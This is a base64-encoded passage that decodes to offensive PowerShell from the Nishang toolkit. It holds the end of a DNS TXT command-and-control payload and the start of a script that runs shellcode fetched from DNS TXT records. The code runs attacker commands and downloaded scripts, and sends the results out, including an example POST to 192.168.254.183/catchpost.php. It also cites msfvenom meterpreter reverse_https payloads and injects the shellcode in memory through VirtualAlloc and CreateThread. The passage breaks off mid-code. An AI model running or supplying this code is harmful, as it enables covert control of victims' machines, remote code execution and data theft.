bm1lbnQgbWF5IGJlIG1vcmUgZGVzaXJhYmxlLgoKSWYgdXNpbmcgRE5TIG9yIFdlYnNlcnZlciBFeGZpbE9wdGlvbiwgdXNlIEludm9rZS1EZWNvZGUucHMxIGluIHRoZSBVdGlsaXR5IGZvbGRlciB0byBkZWNvZGUgdGhlIGV4ZmlsdHJhdGVkIGRhdGEuCgouUEFSQU1FVEVSIHN0YXJ0ZG9tYWluClRoZSBkb21haW4gKG9yIHN1YmRvbWFpbikgd2hvc2UgVFhUIHJlY29yZHMgd291bGQgYmUgY2hlY2tlZCByZWd1bGFybHkgZm9yIGZ1cnRoZXIgaW5zdHJ1Y3Rpb25zLgoKLlBBUkFNRVRFUiBjbWRzdHJpbmcKIFRoZSBzdHJpbmcsIGlmIHJlc3BvbmRlZCBieSBUWFQgcmVjb3JkIG9mIHN0YXJ0ZG9tYWluLCB3aWxsIG1ha2UgdGhlIHBheWxvYWQgIHF1ZXJ5ICJjb21tYW5kZG9tYWluIiBmb3IgY29tbWFuZHMuCiAKLlBBUkFNRVRFUiBjb21tYW5kZG9tYWluClRoZSBkb21haW4gKG9yIHN1YmRvbWFpbikgd2hvc2UgVFhUIHJlY29yZHMgd291bGQgYmUgdXNlZCB0byBpc3N1ZSBjb21tYW5kcyB0byB0aGUgcGF5bG9hZC4KCi5QQVJBTUVURVIgcHNzdHJpbmcKIFRoZSBzdHJpbmcsIGlmIHJlc3BvbmRlZCBieSBUWFQgcmVjb3JkIG9mIHN0YXJ0ZG9tYWluLCB3aWxsIG1ha2UgdGhlIHBheWxvYWQgIHF1ZXJ5ICJwc2RvbWFpbiIgZm9yIGVuY29kZWQgcG93ZXJzaGVsbCBzY3JpcHQuIAoKLlBBUkFNRVRFUiBwc2RvbWFpbgpUaGUgZG9tYWluIChvciBzdWJkb21haW4pIHdob3NlIHN1YmRvbWFpbnMgd291bGQgYmUgdXNlZCB0byBwcm92aWRlIHBvd2Vyc2hlbGwgc2NyaXB0cyBmcm9tIFRYVCByZWNvcmRzLgoKLlBBUkFNRVRFUiBBcmd1bWVudHMKQXJndW1lbnRzIHRvIGJlIHBhc3NlZCB0byBhIHNjcmlwdC4gUG93ZXJwcmV0ZXIgYW5kIG90aGVyIHNjcmlwdHMgaW4gTmlzaGFuZyBuZWVkIHRoZSBmdW5jdGlvbiBuYW1lIGFuZCBhcmd1bWVudHMgaGVyZS4KCi5QQVJBTUVURVIgc3ViZG9tYWlucwpUaGUgbnVtYmVyIG9mIHN1YmRvbWFpbnMgd2hpY2ggd291bGQgYmUgdXNlZCB0byBwcm92aWRlIHBvd2Vyc2hlbGwgc2NyaXB0cyBmcm9tIHRoZWlyIFRYVCByZWNvcmRzLgpUaGUgbGVuZ3RoIG9mIEROUyBUWFQgcmVjb3JkcyBpcyBhc3N1bWVkIHRvIGJlIDI1NSBjaGFyYWN0ZXJzLCBzbyBtb3JlIHRoYW4gb25lIHN1YmRvbWFpbnMgd291bGQgYmUgcmVxdWlyZWQuCgouUEFSQU1FVEVSIHN0b3BzdHJpbmcKVGhlIHN0cmluZywgaWYgcmVzcG9uZGVkIGJ5IFRYVCByZWNvcmQgb2Ygc3RhcnRkb21haW4sIHdpbGwgc3RvcCB0aGlzIHBheWxvYWQgb24gdGhlIHRhcmdldC4KCi5QQVJBTUVURVIgQXV0aE5TCkF1dGhvcml0YXRpdmUgTmFtZSBTZXJ2ZXIgZm9yIHRoZSBkb21haW5zIChvciBmb3Igc3RhcnRkb21haW4gaW4gY2FzZSB5b3UgYXJlIHVzaW5nIHNlcGFyYXRlIGRvbWFpbnMpLiAKU3RhcnRkb21haW4gd291bGQgYmUgY2hhbmdlZCBmb3IgY29tbWFuZHMgYW5kIGFuIGF1dGhvcml0YXRpdmUgcmVwbHkgc2hvdWRsIHJlZmxlY3QgY2hhbmdlcyBpbW1lZGlhdGVseS4KCgouRVhBTVBMRQpQUyA+IEROU19UWFRfUHduYWdlClRoZSBwYXlsb2FkIHdpbGwgYXNrIGZvciBhbGwgcmVxdWlyZWQgb3B0aW9ucy4KCi5FWEFNUExFClBTID4gRE5TX1RYVF9Qd25hZ2UgLVN0YXJ0RG9tYWluIHN0YXJ0LmFsdGVyZWRzZWN1cml0eS5jb20gLWNtZHN0cmluZyBiZWdpbmNvbW1hbmRzIC1Db21tYW5kRG9tYWluIGNvbW1hbmQuYWx0ZXJlZHNlY3VyaXR5LmNvbSAtcHNzdHJpbmcgc3RhcnRzY3JpcHQgLVBTRG9tYWluIHNjcmlwdC5hbHRlcmVkc2VjdXJpdHkuY29tIC1Bcmd1bWVudHMgR2V0LVdMQU4tS2V5cyAtU3ViZG9tYWlucyAzIC1TdG9wU3RyaW5nIHN0b3AgLUF1dGhOUyBuczguem9uZWVkaXQuY29tCkluIHRoZSBhYm92ZSBleGFtcGxlIGlmIHlvdSB3YW50IHRvIGV4ZWN1dGUgY29tbWFuZHMuIFRYVCByZWNvcmQgb2Ygc3RhcnQuYWx0ZXJlZHNlY3VyaXR5LmNvbQptdXN0IGNvbnRhaW4gb25seSAiYmVnaW5jb21tYW5kcyIgYW5kIGNvbW1hbmQuYWx0ZXJlZHNlY3VyaXR5LmNvbSBzaG91bGQgY29uYXRpbiBhIHNpbmdsZSBjb21tYW5kIAp5b3Ugd2FudCB0byBleGVjdXRlLiBUaGUgVFhUIHJlY29yZCBjb3VsZCBiZSBjaGFuZ2VkIGxpdmUgYW5kIHRoZSBwYXlsb2FkIHdpbGwgcGljayB1cCB1cGRhdGVkIApyZWNvcmQgdG8gZXhlY3V0ZSBuZXcgY29tbWFuZC4KClRvIGV4ZWN1dGUgYSBzY3JpcHQgaW4gYWJvdmUgZXhhbXBsZSwgc3RhcnQuYWx0ZXJlZHNlY3VyaXR5LmNvbSBtdXN0IGNvbnRhaW4gInN0YXJ0c2NyaXB0Ii4gQXMgc29vbiBpdCBtYXRjaGVzLCB0aGUgcGF5bG9hZCB3aWxsIHF1ZXJ5IAoxLnNjcmlwdC5hbHRlcmVkc2VjdXJpdHkuY29tLCAyLnNjcmlwdC5hbHRlcmVkc2VjdXJpdHkuY29tIGFuZCAzLnNjcmlwdC5hbHRlcmVkc2VjdXJpdHkuY29tIGxvb2tpbmcgZm9yIGEgYmFzZTY0ZW5jb2RlZCBwb3dlcnNoZWxsIHNjcmlwdC4gClVzZSB0aGUgQXJndW1lbnRzIHBhcmFtdGVyIGlmIHRoZSBkb3dubG9hZGVkIHNjcmlwdCBsb2FkcyBhIGZ1bmN0aW9uLgpVc2UgdGhlIE91dC1EbnNUeHQgc2NyaXB0IGluIHRoZSBVdGlsaXR5IGZvbGRlciB0byBlbmNvZGUgc2NyaXB0cyB0byBiYXNlNjQuCgouRVhBTVBMRQpQUyA+IEROU19UWFRfUHduYWdlIC1TdGFydERvbWFpbiBzdGFydC5hbHRlcmVkc2VjdXJpdHkuY29tIC1jbWRzdHJpbmcgYmVnaW5jb21tYW5kcyAtQ29tbWFuZERvbWFpbiBjb21tYW5kLmFsdGVyZWRzZWN1cml0eS5jb20gLXBzc3RyaW5nIHN0YXJ0c2NyaXB0IC1QU0RvbWFpbiBzY3JpcHQuYWx0ZXJlZHNlY3VyaXR5LmNvbSAtQXJndW1lbnRzIEdldC1XTEFOLUtleXMgLVN1YmRvbWFpbnMgMyAtU3RvcFN0cmluZyBzdG9wIC1BdXRoTlMgbnM4LnpvbmVlZGl0LmNvbSB8IERvLUV4ZmlsdHJhdGlvbiAtRXhmaWxPcHRpb24gV2Vic2VydmVyIC1VUkwgaHR0cDovLzE5Mi4xNjguMjU0LjE4My9jYXRjaHBvc3QucGhwClVzZSBhYm92ZSBjb21tYW5kIGZvciBzZW5kaW5nIFBPU1QgcmVxdWVzdCB0byB5b3VyIHdlYnNlcnZlciB3aGljaCBpcyBhYmxlIHRvIGxvZyB0aGUgcmVxdWVzdHMuCgouTElOSwpodHRwOi8vd3d3LmxhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8yMDE1LzAxL2Z1bi13aXRoLWRucy10eHQtcmVjb3Jkcy1hbmQtcG93ZXJzaGVsbC5odG1sCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCiM+CgoKICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lPSJub2V4ZmlsIildIFBhcmFtKAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHN0YXJ0ZG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJGNtZHN0cmluZywKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRjb21tYW5kZG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHBzc3RyaW5nLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHBzZG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNSwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRBcmd1bWVudHMgPSAiT3V0LU51bGwiLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNiwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFN1YmRvbWFpbnMsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA3LCBNYW5kYXRvcnkgPSAkVHJ1ZSldCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFN0b3BTdHJpbmcsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA4LCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10kQXV0aE5TLAoKCiAgICAgICAgW1BhcmFtZXRlcigpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE5vTG9hZEZ1bmN0aW9uCiAgICAgICAgCiAgICApICAgIAoKICAgIHdoaWxlKCR0cnVlKQogICAgewogICAgICAgICRleGVjID0gMAogICAgICAgIHN0YXJ0LXNsZWVwIC1zZWNvbmRzIDUKICAgICAgICBpZiAoJEF1dGhOUyAtbmUgJG51bGwpCiAgICAgICAgewogICAgICAgICAgICAkZ2V0Y29kZSA9IChJbnZva2UtRXhwcmVzc2lvbiAibnNsb29rdXAgLXF1ZXJ5dHlwZT10eHQgJHN0YXJ0ZG9tYWluICRBdXRoTlMiKSAKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJGdldGNvZGUgPSAoSW52b2tlLUV4cHJlc3Npb24gIm5zbG9va3VwIC1xdWVyeXR5cGU9dHh0ICRzdGFydGRvbWFpbiIpIAogICAgICAgIH0KICAgICAgICAkdG1wID0gJGdldGNvZGUgfCBzZWxlY3Qtc3RyaW5nIC1wYXR0ZXJuICJgIiIKICAgICAgICAkc3RhcnRjb2RlID0gJHRtcCAtc3BsaXQoImAiIilbMF0KICAgICAgICBpZiAoJHN0YXJ0Y29kZVsxXSAtZXEgJGNtZHN0cmluZykKICAgICAgICB7CiAgICAgICAgICAgIHN0YXJ0LXNsZWVwIC1zZWNvbmRzIDUKICAgICAgICAgICAgaWYgKCRBdXRoTlMgLW5lICRudWxsKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkZ2V0Y29tbWFuZCA9IChJbnZva2UtRXhwcmVzc2lvbiAibnNsb29rdXAgLXF1ZXJ5dHlwZT10eHQgJGNvbW1hbmRkb21haW4gJEF1dGhOUyIpIAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGdldGNvbW1hbmQgPSAoSW52b2tlLUV4cHJlc3Npb24gIm5zbG9va3VwIC1xdWVyeXR5cGU9dHh0ICRjb21tYW5kZG9tYWluIikgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHRlbXAgPSAkZ2V0Y29tbWFuZCB8IHNlbGVjdC1zdHJpbmcgLXBhdHRlcm4gImAiIgogICAgICAgICAgICAkY29tbWFuZCA9ICR0ZW1wIC1zcGxpdCgiYCIiKVswXQogICAgICAgICAgICAkcGFzdGV2YWx1ZSA9IEludm9rZS1FeHByZXNzaW9uICRjb21tYW5kWzFdCiAgICAgICAgICAgICRwYXN0ZXZhbHVlCiAgICAgICAgICAgICRleGVjKysKICAgICAgICAgICAgaWYgKCRleGZpbCAtZXEgJFRydWUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRwYXN0ZW5hbWUgPSAkZW52OkNPTVBVVEVSTkFNRSArICIgUmVzdWx0cyBvZiBETlMgVFhUIFB3bmFnZTogIgogICAgICAgICAgICAgICAgRG8tRXhmaWx0cmF0aW9uICIkcGFzdGVuYW1lIiAiJHBhc3RldmFsdWUiICIkRXhmaWxPcHRpb24iICIkZGV2X2tleSIgIiR1c2VybmFtZSIgIiRwYXNzd29yZCIgIiRVUkwiICIkRG9tYWluTmFtZSIgIiRFeGZpbE5TIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkZXhlYyAtZXEgMSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNjAKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKCRzdGFydGNvZGVbMV0gLW1hdGNoICRwc3N0cmluZykKICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgJGkgPSAxCiAgICAgICAgICAgIHdoaWxlICgkaSAtbGUgJHN1YmRvbWFpbnMpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmICgkQXV0aE5TIC1uZSAkbnVsbCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkZ2V0Y29tbWFuZCA9IChJbnZva2UtRXhwcmVzc2lvbiAibnNsb29rdXAgLXF1ZXJ5dHlwZT10eHQgJGkuJHBzZG9tYWluICRBdXRoTlMiKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRnZXRjb21tYW5kID0gKEludm9rZS1FeHByZXNzaW9uICJuc2xvb2t1cCAtcXVlcnl0eXBlPXR4dCAkaS4kcHNkb21haW4iKSAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0ZW1wID0gJGdldGNvbW1hbmQgfCBzZWxlY3Qtc3RyaW5nIC1wYXR0ZXJuICJgIiIKICAgICAgICAgICAgICAgICR0bXAxID0gIiIKICAgICAgICAgICAgICAgICR0bXAxID0gJHRtcDEgKyAkdGVtcAogICAgICAgICAgICAgICAgJGVuY2RhdGEgPSAkZW5jZGF0YSArICR0bXAxIC1yZXBsYWNlICdccysnLCAiIiAtcmVwbGFjZSAiYCIiLCAiIgogICAgICAgICAgICAgICAgJGkrKwogICAgICAgICAgICB9CiAgICAgICAgICAgICNEZWNvZGUgdGhlIGRvd25sb2FkZWQgcG93ZXJzaGVsbCBzY3JpcHQuIFRoZSBkZWNvZGluZyBsb2dpYyBpcyBvZiBJbnZva2UtRGVjb2RlIGluIFV0aWxpdHkgZGlyZWN0b3J5LgogICAgICAgICAgICAkZGVjID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkZW5jZGF0YSkKICAgICAgICAgICAgJG1zID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtCiAgICAgICAgICAgICRtcy5Xcml0ZSgkZGVjLCAwLCAkZGVjLkxlbmd0aCkKICAgICAgICAgICAgJG1zLlNlZWsoMCwwKSB8IE91dC1OdWxsCiAgICAgICAgICAgICRjcyA9IE5ldy1PYmplY3QgU3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0gKCRtcywgW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5Db21wcmVzc2lvbk1vZGVdOjpEZWNvbXByZXNzKQogICAgICAgICAgICAkc3IgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5TdHJlYW1SZWFkZXIoJGNzKQogICAgICAgICAgICAkY29tbWFuZCA9ICRzci5yZWFkdG9lbmQoKQogICAgICAgICAgICAkcGFzdGV2YWx1ZSA9IEludm9rZS1FeHByZXNzaW9uICRjb21tYW5kCgogICAgICAgICAgICAjIENoZWNrIGZvciBhcmd1bWVudHMgdG8gdGhlIGRvd25sb2FkZWQgc2NyaXB0LgogICAgICAgICAgICBpZiAoJEFyZ3VtZW50cyAtbmUgIk91dC1OdWxsIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHBhc3RldmFsdWUgPSBJbnZva2UtRXhwcmVzc2lvbiAkQXJndW1lbnRzICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CgogICAgICAgICAgICAkcGFzdGV2YWx1ZSAgICAgICAgICAgIAogICAgICAgICAgICAkZXhlYysrCiAgICAgICAgICAgIGlmICgkZXhmaWwgLWVxICRUcnVlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkcGFzdGVuYW1lID0gJGVudjpDT01QVVRFUk5BTUUgKyAiIFJlc3VsdHMgb2YgRE5TIFRYVCBQd25hZ2U6ICIKICAgICAgICAgICAgICAgIERvLUV4ZmlsdHJhdGlvbiAiJHBhc3RlbmFtZSIgIiRwYXN0ZXZhbHVlIiAiJEV4ZmlsT3B0aW9uIiAiJGRldl9rZXkiICIkdXNlcm5hbWUiICIkcGFzc3dvcmQiICIkVVJMIiAiJERvbWFpbk5hbWUiICIkRXhmaWxOUyIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJGV4ZWMgLWVxIDEpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDYwCiAgICAgICAgICAgIH0KCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGlmKCRzdGFydGNvZGVbMV0gLWVxICRTdG9wU3RyaW5nKQogICAgICAgIHsKICAgICAgICAgICAgYnJlYWsKICAgICAgICB9CiAgICB9Cn0KCiMjIyMjIyMjIyMjIyMjIyMjIyMjI0V4ZWN1dGUgc2hlbGxjb2RlIGluLW1lbW9yeS4gVGhlIHNoZWxsY29kZSBpcyByZWNpZXZlZCBmcm9tIEROUyBUWFQgcXVlcmllcy4jIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmZ1bmN0aW9uIEV4ZWN1dGUtRE5TVFhULUNvZGUKewoKCjwjCi5TWU5PUFNJUwpQYXlsb2FkIHdoaWNoIGNvdWxkIGV4ZWN1dGUgc2hlbGxjb2RlIGZyb20gRE5TIFRYVCBxdWVyaWVzLgoKLkRFU0NSSVBUSU9OClRoaXMgcGF5bG9hZCBpcyBhYmxlIHRvIHB1bGwgc2hlbGxjb2RlIGZyb20gdHh0IHJlY29yZCBvZiBhIGRvbWFpbi4gCkJlbG93IGNvbW1hbmRzIGNvdWxkIGJlIHVzZWQgdG8gZ2VuZXJhdGUgc2hlbGxjb2RlIHRvIGJlIHVzYWJsZSB3aXRoIHRoaXMgc2NyaXB0Ci4vbXNmdmVub20gLXAgd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzIC1mIHBvd2Vyc2hlbGwgTEhPU1Q9PD4KLi9tc2Z2ZW5vbSAtcCB3aW5kb3dzL3g2NC9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzIC1mIHBvd2Vyc2hlbGwgTEhPU1Q9PD4KClRvIGdlbmVyYXRlIFRYVCByZWNvcmRzIGZyb20gYWJvdmUgc2hlbGxjb2RlLCB1c2UgT3V0LURuc1R4dC5wczEgaW4gdGhlIFV0aWxpdHkgZm9sZGVyLgoKLlBBUkFNRVRFUiBzaGVsbGNvZGUzMgpUaGUgZG9tYWluIChvciBzdWJkb21haW4pIHdob3NlIHN1YmJkb21haW4ncyBUWFQgcmVjb3JkcyB3b3VsZCBob2xkIDMyLWJpdCBzaGVsbGNvZGUuCgouUEFSQU1FVEVSIHNoZWxsY29kZTY0ClRoZSBkb21haW4gKG9yIHN1YmRvbWFpbikgd2hvc2Ugc3ViYmRvbWFpbidzIFRYVCByZWNvcmRzIHdvdWxkIGhvbGQgNjQtYml0IHNoZWxsY29kZS4KCiAuUEFSQU1FVEVSIEFVVEhOUwpBdXRob3JpdGF0aXZlIE5hbWUgU2VydmVyIGZvciB0aGUgZG9tYWlucy4KCi5QQVJBTUVURVIgc3ViZG9tYWlucwpUaGUgbnVtYmVyIG9mIHN1YmRvbWFpbnMgd2hpY2ggd291bGQgYmUgdXNlZCB0byBwcm92aWRlIHNoZWxsY29kZSBmcm9tIHRoZWlyIFRYVCByZWNvcmRzLgoKCi5FWEFNUExFClBTID4gRXhlY3V0ZS1ETlNUWFQtQ29kZQpUaGUgcGF5bG9hZCB3aWxsIGFzayBmb3IgYWxsIHJlcXVpcmVkIG9wdGlvbnMuCgouRVhBTVBMRQpQUyA+IEV4ZWN1dGUtRE5TVFhULUNvZGUgMzIuYWx0ZXJlZHNlY3VyaXR5LmNvbSA2NC5hbHRlcmVkc2VjdXJpdHkuY29tIG5zOC56b25lZWRpdC5jb20gLVN1YkRvbWFpbnMgNQpVc2UgYWJvdmUgZnJvbSBub24taW50ZXJhY3RpdmUgc2hlbGwuCgouTElOSwpodHRwOi8vd3d3LmxhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8yMDE1LzAxL2Z1bi13aXRoLWRucy10eHQtcmVjb3Jkcy1hbmQtcG93ZXJzaGVsbC5odG1sCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCgouTk9URVMKVGhlIGNvZGUgZXhlY3V0aW9uIGxvZ2ljIGlzIGJhc2VkIG9uIHRoaXMgcG9zdCBieSBNYXR0LgpodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbS8yMDExLzEwL2V4cGxvaXRpbmctcG93ZXJzaGVsbHMtZmVhdHVyZXMtbm90Lmh0bWwKIz4KICAgIAogICAgCiAgICBbQ21kbGV0QmluZGluZygpXSBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNoZWxsQ29kZTMyLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNoZWxsQ29kZTY0LAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEF1dGhOUywKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTdWJkb21haW5zCgogICAgKQogICAgCiAgICAjRnVuY3Rpb24gdG8gZ2V0IHNoZWxsY29kZSBmcm9tIFRYVCByZWNvcmRzCiAgICBmdW5jdGlvbiBHZXQtU2hlbGxDb2RlCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJFNoZWxsQ29kZQogICAgICAgICkKICAgICAgICAkaSA9IDEKICAgICAgICB3aGlsZSAoJGkgLWxlICRzdWJkb21haW5zKQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCRBdXRoTlMgLW5lICRudWxsKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkZ2V0Y29tbWFuZCA9IChJbnZva2UtRXhwcmVzc2lvbiAibnNsb29rdXAgLXF1ZXJ5dHlwZT10eHQgJGkuJFNoZWxsQ29kZSAkQXV0aE5TIikgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkZ2V0Y29tbWFuZCA9IChJbnZva2UtRXhwcmVzc2lvbiAibnNsb29rdXAgLXF1ZXJ5dHlwZT10eHQgJGkuJFNoZWxsQ29kZSIpIAogICAgICAgICAgICB9CiAgICAgICAgICAgICR0ZW1wID0gJGdldGNvbW1hbmQgfCBzZWxlY3Qtc3RyaW5nIC1wYXR0ZXJuICJgIiIKICAgICAgICAgICAgJHRtcDEgPSAiIgogICAgICAgICAgICAkdG1wMSA9ICR0bXAxICsgJHRlbXAKICAgICAgICAgICAgJGVuY2RhdGEgPSAkZW5jZGF0YSArICR0bXAxIC1yZXBsYWNlICdccysnLCAiIiAtcmVwbGFjZSAiYCIiLCAiIgogICAgICAgICAgICAkaSsrCiAgICAgICAgfQogICAgICAgICNEZWNvZGUgdGhlIGRvd25sb2FkZWQgcG93ZXJzaGVsbCBzY3JpcHQuIFRoZSBkZWNvZGluZyBsb2dpYyBpcyBvZiBJbnZva2UtRGVjb2RlIGluIFV0aWxpdHkgZGlyZWN0b3J5LgogICAgICAgICRkZWMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRlbmNkYXRhKQogICAgICAgICRtcyA9IE5ldy1PYmplY3QgU3lzdGVtLklPLk1lbW9yeVN0cmVhbQogICAgICAgICRtcy5Xcml0ZSgkZGVjLCAwLCAkZGVjLkxlbmd0aCkKICAgICAgICAkbXMuU2VlaygwLDApIHwgT3V0LU51bGwKICAgICAgICAkY3MgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5Db21wcmVzc2lvbi5EZWZsYXRlU3RyZWFtICgkbXMsIFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykKICAgICAgICAkc3IgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5TdHJlYW1SZWFkZXIoJGNzKQogICAgICAgICRzYyA9ICRzci5yZWFkdG9lbmQoKQogICAgICAgIHJldHVybiAkc2MKICAgIH0KICAgIGlmIChbSW50UHRyXTo6U2l6ZSAtZXEgOCkgCiAgICB7CiAgICAgICAgJFNoZWxsNjQgPSAoR2V0LVNoZWxsQ29kZSAkU2hlbGxDb2RlNjQpCiAgICAgICAgI1JlbW92ZSB1bnJlcXVpcmVkIHRoaW5ncyBmcm9tIG1zZiBzaGVsbGNvZGUKICAgICAgICAkdG1wID0gJFNoZWxsNjQgLXJlcGxhY2UgImBuIiwiIiAtcmVwbGFjZSAnXCRidWYgXCtcPSAnLCIsIiAtcmVwbGFjZSAnXFtCeXRlXFtcXVxdIFwkYnVmIFw9JyAtcmVwbGFjZSAiICIKICAgICAgICBbQnl0ZVtdXSRzYyA9ICR0bXAgLXNwbGl0ICcsJwogICAgfSAKICAgIGVsc2UKICAgIHsKICAgICAgICAkc2hlbGwzMiA9IChHZXQtU2hlbGxDb2RlICRTaGVsbENvZGUzMikKICAgICAgICAkdG1wID0gJFNoZWxsMzIgLXJlcGxhY2UgImBuIiwiIiAtcmVwbGFjZSAnXCRidWYgXCtcPSAnLCIsIiAtcmVwbGFjZSAnXFtCeXRlXFtcXVxdIFwkYnVmIFw9JyAtcmVwbGFjZSAiICIKICAgICAgICBbQnl0ZVtdXSRzYyA9ICR0bXAgLXNwbGl0ICcsJwogICAgfQoKICAgICNDb2RlIEV4ZWN1dGlvbiBsb2dpYwogICAgJGNvZGUgPSBAJyAKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSAKICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2MoSW50UHRyIGxwQWRkcmVzcywgdWludCBkd1NpemUsIHVpbnQgZmxBbGxvY2F0aW9uVHlwZSwgdWludCBmbFByb3RlY3QpOyAKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSAKICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQoSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgdWludCBkd1N0YWNrU2l6ZSwgSW50UHRyIGxwU3RhcnRBZGRyZXNzLCBJbnRQdHIgbHBQYXJhbWV0ZXIsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBUaHJlYWRJZCk7IAogICAgW0RsbEltcG9ydCgibXN2Y3J0LmRsbCIpXSAKICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBtZW1zZXQoSW50UHRyIGRlc3QsIHVpbnQgc3JjLCB1aW50IGNvdW50KTsgCidAIAogICAgJHdpbkZ1bmMgPSBBZGQtVHlwZSAtbWVtYmVyRGVmaW5pdGlvbiAkY29kZSAtTmFtZSAiV2luMzIiIC1uYW1lc3BhY2UgV2luMzJGdW5jdGlvbnMgLXBhc3N0aHJ1IAogICAgJHNpemUgPSAweDEwMDAgCiAgICBpZiAoJHNjLkxlbmd0aCAtZ3QgMHgxMDAwKSB7JHNpemUgPSAkc2MuTGVu